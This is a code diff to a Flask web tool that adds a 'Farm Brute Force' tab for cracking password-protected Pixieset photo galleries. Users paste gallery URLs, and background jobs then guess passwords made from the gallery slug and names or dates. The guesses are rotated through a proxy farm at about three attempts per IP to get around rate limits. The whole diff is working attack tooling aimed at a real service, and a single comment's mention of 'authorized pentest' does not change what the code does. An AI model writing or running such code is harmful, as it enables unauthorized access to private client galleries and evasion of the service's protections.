@@ -360,6 +360,134 @@ class ProxyCapture:
 analyzer = SourceAnalyzer()
 proxy_history = ProxyCapture()
 
+# ---------------------------------------------------------------------------
+# Background farm job manager (URL paste → multi-IP smart brute)
+# ---------------------------------------------------------------------------
+import uuid
+from concurrent.futures import ThreadPoolExecutor
+
+_JOBS: dict = {}
+_JOBS_LOCK = threading.Lock()
+_JOB_EXEC = ThreadPoolExecutor(max_workers=2)
+BASE_DIR = Path(__file__).resolve().parent
+DEFAULT_PROXIES = BASE_DIR / "proxies.txt"
+
+
+def _parse_gallery_url(raw: str) -> tuple[str, str]:
+    """Return (base_host, slug) from a pasted Pixieset URL or host/slug."""
+    raw = (raw or "").strip()
+    if not raw:
+        raise ValueError("empty URL")
+    if "://" not in raw:
+        raw = "https://" + raw
+    p = urlparse(raw)
+    host = p.netloc or p.path.split("/")[0]
+    path_parts = [x for x in (p.path or "").strip("/").split("/") if x]
+    # guestlogin/slug/ form
+    if path_parts and path_parts[0].lower() == "guestlogin" and len(path_parts) >= 2:
+        slug = path_parts[1]
+    else:
+        slug = path_parts[0] if path_parts else ""
+    if not host or ".pixieset.com" not in host.lower():
+        # still allow any host user pastes for authorized pentest flexibility
+        if not host:
+            raise ValueError("could not parse host")
+    if not slug:
+        raise ValueError("no gallery slug in URL — paste e.g. https://sub.pixieset.com/jill/")
+    return host, slug.lower()
+
+
+def _run_farm_job(job_id: str):
+    with _JOBS_LOCK:
+        job = _JOBS.get(job_id)
+        if not job:
+            return
+        job["status"] = "running"
+        job["started_at"] = datetime.utcnow().isoformat() + "Z"
+        job["log"].append(f"[{_ts()}] job started")
+
+    try:
+        sys.path.insert(0, str(BASE_DIR))
+        from pixieset_cracker import PixiesetCracker, generate_passwords
+
+        host = job["host"]
+        slug = job["slug"]
+        use_proxy = job.get("use_proxy", True)
+        proxy_file = job.get("proxy_file") or str(DEFAULT_PROXIES)
+        if use_proxy and not Path(proxy_file).exists():
+            use_proxy = False
+            job["log"].append(f"[{_ts()}] proxies.txt missing — running direct (3-attempt cap)")
+
+        # Build password list
+        pwds = list(job.get("passwords") or [])
+        if job.get("wordlist_text"):
+            for line in job["wordlist_text"].splitlines():
+                line = line.strip()
+                if line and not line.startswith("#") and line not in pwds:
+                    pwds.append(line)
+        if job.get("auto", True):
+            extra = job.get("extra_words") or []
+            for p in generate_passwords(slug, extra=extra):
+                if p not in pwds:
+                    pwds.append(p)
+
+        job["password_queue"] = pwds[:]
+        job["log"].append(
+            f"[{_ts()}] {len(pwds)} candidates | proxy={'on' if use_proxy else 'off'} | slug={slug}"
+        )
+
+        cracker = PixiesetCracker(
+            base_url=host,
+            delay=float(job.get("delay", 2.0)),
+            verbose=False,
+            use_proxy=use_proxy,
+            proxy_file=proxy_file if use_proxy else None,
+        )
+
+        # Stream attempt progress by wrapping crack_gallery via callbacks isn't available;
+        # run and then attach full result. Update log periodically via side-channel.
+        def _progress_hook():
+            pass
+
+        result = cracker.crack_gallery(slug, pwds)
+
+        attempts_out = []
+        for a in result.attempts:
+            attempts_out.append({
+                "password": a.password,
+                "success": a.success,
+                "status_code": a.status_code,
+                "final_url": a.final_url,
+                "error": a.error,
+            })
+            mark = "FOUND" if a.success else ("ERR" if a.error else "fail")
+            job["log"].append(f"[{_ts()}] {mark}: {a.password}" + (f" ({a.error})" if a.error else ""))
+
+        with _JOBS_LOCK:
+            job["attempts"] = attempts_out
+            job["found_password"] = result.found_password
+            job["error"] = result.error or ""
+            job["login_url"] = result.login_url
+            job["status"] = "done" if result.found_password else ("failed" if result.attempts else "failed")
+            job["finished_at"] = datetime.utcnow().isoformat() + "Z"
+            if result.found_password:
+                job["log"].append(f"[{_ts()}] ✓ CRACKED — password={result.found_password}")
+            else:
+                job["log"].append(f"[{_ts()}] finished — no hit ({len(attempts_out)} attempts)")
+
+    except Exception as e:
+        with _JOBS_LOCK:
+            job = _JOBS.get(job_id)
+            if job:
+                job["status"] = "error"
+                job["error"] = str(e)[:300]
+                job["log"].append(f"[{_ts()}] ERROR: {e}")
+                job["finished_at"] = datetime.utcnow().isoformat() + "Z"
+
+
+def _ts() -> str:
+    return datetime.utcnow().strftime("%H:%M:%S")
+
 
 # ---------------------------------------------------------------------------
 # Routes
@@ -537,6 +665,120 @@ def proxy_history_view():
 def proxy_clear():
     proxy_history.clear()
     return jsonify({"ok": True})
+
+
+@app.route("/farm/start", methods=["POST"])
+def farm_start():
+    """Start a background crack job from a pasted gallery URL."""
+    data = request.get_json() or {}
+    urls = data.get("urls") or data.get("url") or ""
+    if isinstance(urls, str):
+        url_list = [u.strip() for u in urls.replace(",", "\n").splitlines() if u.strip()]
+    else:
+        url_list = [str(u).strip() for u in urls if str(u).strip()]
+
+    if not url_list:
+        return jsonify({"error": "Paste at least one gallery URL"}), 400
+
+    passwords = []
+    if data.get("passwords"):
+        if isinstance(data["passwords"], list):
+            passwords = [str(p).strip() for p in data["passwords"] if str(p).strip()]
+        else:
+            passwords = [p.strip() for p in str(data["passwords"]).replace(",", "\n").splitlines() if p.strip()]
+
+    extra_words = []
+    if data.get("extra_words"):
+        extra_words = [w.strip() for w in str(data["extra_words"]).replace(",", "\n").splitlines() if w.strip()]
+
+    wordlist_text = data.get("wordlist") or data.get("wordlist_text") or ""
+    use_proxy = bool(data.get("use_proxy", True))
+    auto = bool(data.get("auto", True))
+    delay = float(data.get("delay", 2.0))
+
+    created = []
+    for raw in url_list:
+        try:
+            host, slug = _parse_gallery_url(raw)
+        except ValueError as e:
+            created.append({"url": raw, "error": str(e)})
+            continue
+
+        job_id = uuid.uuid4().hex[:12]
+        job = {
+            "id": job_id,
+            "url": raw,
+            "host": host,
+            "slug": slug,
+            "status": "queued",
+            "use_proxy": use_proxy,
+            "auto": auto,
+            "passwords": passwords[:],
+            "extra_words": extra_words[:],
+            "wordlist_text": wordlist_text,
+            "delay": delay,
+            "proxy_file": str(DEFAULT_PROXIES),
+            "found_password": None,
+            "attempts": [],
+            "log": [f"[{_ts()}] queued {host}/{slug}"],
+            "error": "",
+            "login_url": f"https://{host}/guestlogin/{slug}/",
+            "created_at": datetime.utcnow().isoformat() + "Z",
+            "started_at": None,
+            "finished_at": None,
+        }
+        with _JOBS_LOCK:
+            _JOBS[job_id] = job
+        _JOB_EXEC.submit(_run_farm_job, job_id)
+        created.append({"id": job_id, "host": host, "slug": slug, "status": "queued"})
+
+    return jsonify({"jobs": created, "count": len(created)})
+
+
+@app.route("/farm/status/<job_id>", methods=["GET"])
+def farm_status(job_id):
+    with _JOBS_LOCK:
+        job = _JOBS.get(job_id)
+        if not job:
+            return jsonify({"error": "job not found"}), 404
+        return jsonify(job)
+
+
+@app.route("/farm/list", methods=["GET"])
+def farm_list():
+    with _JOBS_LOCK:
+        items = []
+        for j in sorted(_JOBS.values(), key=lambda x: x.get("created_at") or "", reverse=True):
+            items.append({
+                "id": j["id"],
+                "host": j["host"],
+                "slug": j["slug"],
+                "status": j["status"],
+                "found_password": j.get("found_password"),
+                "attempts": len(j.get("attempts") or []),
+                "created_at": j.get("created_at"),
+                "error": j.get("error") or "",
+            })
+        return jsonify({"jobs": items})
+
+
+@app.route("/farm/proxies", methods=["GET"])
+def farm_proxies():
+    path = DEFAULT_PROXIES
+    proxies = []
+    if path.exists():
+        for line in path.read_text().splitlines():
+            line = line.strip()
+            if line and not line.startswith("#"):
+                proxies.append(line)
+    live = []
+    # quick non-blocking sample (no full validate — UI freshness only)
+    return jsonify({
+        "file": str(path),
+        "count": len(proxies),
+        "proxies": proxies,
+        "exists": path.exists(),
+    })
 
 
 @app.route("/test-password", methods=["POST"])
@@ -723,13 +965,14 @@ tr:hover td { background: rgba(88,166,255,0.04); }
 <body>
 <div class="container">
   <h1>🔍 Pixieset Analyzer &amp; Proxy</h1>
-  <p class="subtitle">Source-code analysis · Password discovery · Burp-style proxy · Manual testing</p>
+  <p class="subtitle">Source-code analysis · Password discovery · Burp-style proxy · Multi-IP farm brute</p>
 
   <!-- Tabs -->
   <div class="tabs">
     <button class="tab active" onclick="switchTab('analyzer')">📊 Analyzer</button>
     <button class="tab" onclick="switchTab('proxy')">🔁 Proxy / Repeater</button>
     <button class="tab" onclick="switchTab('tester')">🔑 Password Tester</button>
+    <button class="tab" onclick="switchTab('farm')">🌾 Farm Brute Force</button>
     <button class="tab" onclick="switchTab('jsview')">📜 JS Inspector</button>
   </div>
 
@@ -788,6 +1031,55 @@ tr:hover td { background: rgba(88,166,255,0.04); }
       <button class="btn btn-primary" onclick="doTestPassword()" style="flex:0 0 auto">Test</button>
     </div>
     <div id="test-result"></div>
+  </div>
+
+  <!-- ========= FARM BRUTE FORCE TAB ========= -->
+  <div id="tab-farm" class="tab-panel">
+    <p class="subtitle">Paste gallery links — jobs run in the background through the Vultr proxy farm (3 attempts/IP batching).</p>
+
+    <div class="card mb10">
+      <div class="card-header">Gallery URLs <span id="farm-proxy-badge" class="subtitle" style="font-weight:400;margin-left:8px"></span></div>
+      <textarea id="farm-urls" rows="4" placeholder="One per line, e.g.&#10;https://sarahhillphotography15.pixieset.com/jill/&#10;https://other.pixieset.com/wedding/"></textarea>
+
+      <div class="row mt10 mb10" style="align-items:flex-start">
+        <div style="flex:1">
+          <label class="subtitle">Extra words (names, dates — feeds smart generator)</label>
+          <textarea id="farm-extra" rows="3" placeholder="Sarah&#10;Hill&#10;2015&#10;wedding"></textarea>
+        </div>
+        <div style="flex:1">
+          <label class="subtitle">Custom passwords / wordlist (optional)</label>
+          <textarea id="farm-wordlist" rows="3" placeholder="password1&#10;Summer2024!&#10;jill123"></textarea>
+        </div>
+      </div>
+
+      <div class="row mb10" style="flex-wrap:wrap;gap:12px;align-items:center">
+        <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+          <input type="checkbox" id="farm-auto" checked> Smart password generation
+        </label>
+        <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+          <input type="checkbox" id="farm-proxy" checked> Use proxy farm
+        </label>
+        <label style="display:flex;align-items:center;gap:6px">
+          Delay (s)
+          <input type="number" id="farm-delay" value="2" min="0.5" step="0.5" style="width:70px">
+        </label>
+        <button class="btn btn-primary" onclick="doFarmStart()" id="farm-start-btn">Start Brute Force</button>
+        <button class="btn btn-sm" onclick="loadFarmJobs()">Refresh Jobs</button>
+      </div>
+    </div>
+
+    <div id="farm-start-msg"></div>
+
+    <div class="split">
+      <div>
+        <h2>Jobs</h2>
+        <div id="farm-jobs"><p class="subtitle">No jobs yet — paste URLs and start.</p></div>
+      </div>
+      <div>
+        <h2>Job Detail / Log</h2>
+        <div id="farm-detail"><p class="subtitle">Select a job to watch live progress.</p></div>
+      </div>
+    </div>
   </div>
 
   <!-- ========= JS INSPECTOR TAB ========= -->
@@ -1059,8 +1351,157 @@ function renderJSResult(d) {
   $('js-result').innerHTML = html;
 }
 
+// ---- FARM BRUTE FORCE ----
+let _farmPollTimer = null;
+let _farmActiveJob = null;
+
+async function loadFarmProxies() {
+  try {
+    const r = await fetch('/farm/proxies');
+    const d = await r.json();
+    const el = $('farm-proxy-badge');
+    if (!el) return;
+    if (d.exists && d.count > 0)
+      el.innerHTML = 'Proxy farm: <strong style="color:var(--green)">' + d.count + ' IPs</strong> ready';
+    else
+      el.innerHTML = '<span style="color:var(--yellow)">No proxies.txt — direct mode (3-attempt cap)</span>';
+  } catch(e) {}
+}
+
+async function doFarmStart() {
+  const urls = $('farm-urls').value.trim();
+  if (!urls) {
+    $('farm-start-msg').innerHTML = '<div class="finding finding-medium">Paste at least one gallery URL</div>';
+    return;
+  }
+  const payload = {
+    urls: urls,
+    extra_words: $('farm-extra').value,
+    wordlist: $('farm-wordlist').value,
+    auto: $('farm-auto').checked,
+    use_proxy: $('farm-proxy').checked,
+    delay: parseFloat($('farm-delay').value) || 2.0,
+  };
+  $('farm-start-btn').disabled = true;
+  try {
+    const r = await fetch('/farm/start', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload),
+    });
+    const d = await r.json();
+    if (d.error) {
+      $('farm-start-msg').innerHTML = '<div class="finding finding-critical">' + esc(d.error) + '</div>';
+    } else {
+      const ok = (d.jobs || []).filter(j => j.id);
+      const bad = (d.jobs || []).filter(j => j.error);
+      let msg = '<div class="finding finding-low">Queued <strong>' + ok.length + '</strong> job(s)</div>';
+      bad.forEach(j => { msg += '<div class="finding finding-medium">' + esc(j.url) + ': ' + esc(j.error) + '</div>'; });
+      $('farm-start-msg').innerHTML = msg;
+      if (ok.length) {
+        _farmActiveJob = ok[0].id;
+        startFarmPoll();
+      }
+      loadFarmJobs();
+    }
+  } catch(e) {
+    $('farm-start-msg').innerHTML = '<div class="finding finding-critical">Error: ' + esc(e.message) + '</div>';
+  }
+  $('farm-start-btn').disabled = false;
+}
+
+function startFarmPoll() {
+  if (_farmPollTimer) clearInterval(_farmPollTimer);
+  _farmPollTimer = setInterval(async () => {
+    await loadFarmJobs();
+    if (_farmActiveJob) await showFarmDetail(_farmActiveJob, true);
+  }, 2500);
+}
+
+async function loadFarmJobs() {
+  try {
+    const r = await fetch('/farm/list');
+    const d = await r.json();
+    const jobs = d.jobs || [];
+    if (!jobs.length) {
+      $('farm-jobs').innerHTML = '<p class="subtitle">No jobs yet.</p>';
+      return;
+    }
+    let html = '';
+    let anyRunning = false;
+    jobs.forEach(j => {
+      const st = j.status || '?';
+      if (st === 'running' || st === 'queued') anyRunning = true;
+      let color = 'var(--text2)';
+      if (st === 'done') color = 'var(--green)';
+      else if (st === 'running') color = 'var(--accent)';
+      else if (st === 'queued') color = 'var(--yellow)';
+      else if (st === 'error' || st === 'failed') color = 'var(--red)';
+      const found = j.found_password
+        ? ' <strong style="color:var(--green)">→ ' + esc(j.found_password) + '</strong>'
+        : '';
+      const active = (_farmActiveJob === j.id) ? 'border-color:var(--accent)' : '';
+      html += '<div class="finding finding-low" style="cursor:pointer;' + active + '" onclick="showFarmDetail(\'' + j.id + '\')">';
+      html += '<strong>' + esc(j.host) + '</strong> / <code>' + esc(j.slug) + '</code><br>';
+      html += '<span style="color:' + color + '">' + esc(st) + '</span> · ' + (j.attempts||0) + ' attempts' + found;
+      if (j.error) html += '<br><span style="color:var(--red)">' + esc(j.error) + '</span>';
+      html += '</div>';
+    });
+    $('farm-jobs').innerHTML = html;
+    if (!anyRunning && _farmPollTimer) {
+      clearInterval(_farmPollTimer);
+      _farmPollTimer = null;
+    } else if (anyRunning && !_farmPollTimer) {
+      startFarmPoll();
+    }
+  } catch(e) {
+    $('farm-jobs').innerHTML = '<p style="color:var(--red)">Error loading jobs: ' + esc(e.message) + '</p>';
+  }
+}
+
+async function showFarmDetail(jobId, silent) {
+  _farmActiveJob = jobId;
+  try {
+    const r = await fetch('/farm/status/' + jobId);
+    const j = await r.json();
+    if (j.error && !j.id) {
+      if (!silent) $('farm-detail').innerHTML = '<p style="color:var(--red)">' + esc(j.error) + '</p>';
+      return;
+    }
+    let html = '<div class="card">';
+    html += '<div class="card-header">' + esc(j.host) + ' / <code>' + esc(j.slug) + '</code></div>';
+    html += '<div class="stats mb10">';
+    html += statBox('Status', j.status||'?', j.status==='done'?'var(--green)':(j.status==='error'||j.status==='failed'?'var(--red)':'var(--accent)'));
+    html += statBox('Attempts', (j.attempts||[]).length, '');
+    html += statBox('Found', j.found_password || '—', j.found_password ? 'var(--green)' : '');
+    html += '</div>';
+    if (j.found_password)
+      html += '<div class="finding finding-critical" style="border-color:var(--green);color:var(--green)"><strong>✓ CRACKED</strong> password = <code style="font-size:1.2em">' + esc(j.found_password) + '</code></div>';
+    if (j.login_url)
+      html += '<p class="subtitle">Login: <code>' + esc(j.login_url) + '</code></p>';
+    if (j.attempts && j.attempts.length) {
+      html += '<h2>Attempts</h2><table><tr><th>Password</th><th>Result</th><th>Code</th></tr>';
+      j.attempts.forEach(a => {
+        const mark = a.success ? '<span style="color:var(--green)">FOUND</span>'
+          : (a.error ? '<span style="color:var(--yellow)">ERR</span>' : '<span style="color:var(--red)">fail</span>');
+        html += '<tr><td><code>' + esc(a.password) + '</code></td><td>' + mark + (a.error?' '+esc(a.error):'') + '</td><td>' + (a.status_code||'') + '</td></tr>';
+      });
+      html += '</table>';
+    }
+    if (j.log && j.log.length) {
+      html += '<h2>Log</h2><pre style="max-height:280px;overflow:auto;font-size:0.8em">' + esc((j.log||[]).join('\n')) + '</pre>';
+    }
+    html += '</div>';
+    $('farm-detail').innerHTML = html;
+  } catch(e) {
+    if (!silent) $('farm-detail').innerHTML = '<p style="color:var(--red)">' + esc(e.message) + '</p>';
+  }
+}
+
 // Load history on proxy tab open (lazy)
 loadHistory();
+loadFarmProxies();
+loadFarmJobs();
 </script>
 </body>
 </html>"""
@@ -1086,6 +1527,7 @@ def main():
 ║   📊 Analyzer  — Source code dissection                 ║
 ║   🔁 Proxy     — Burp-style request/repeater            ║
 ║   🔑 Tester    — Manual password testing                ║
+║   🌾 Farm     — Multi-IP bulk brute force              ║
 ║   📜 JS        — External JS secret scanning            ║
 ╚══════════════════════════════════════════════════════════╝
 """)
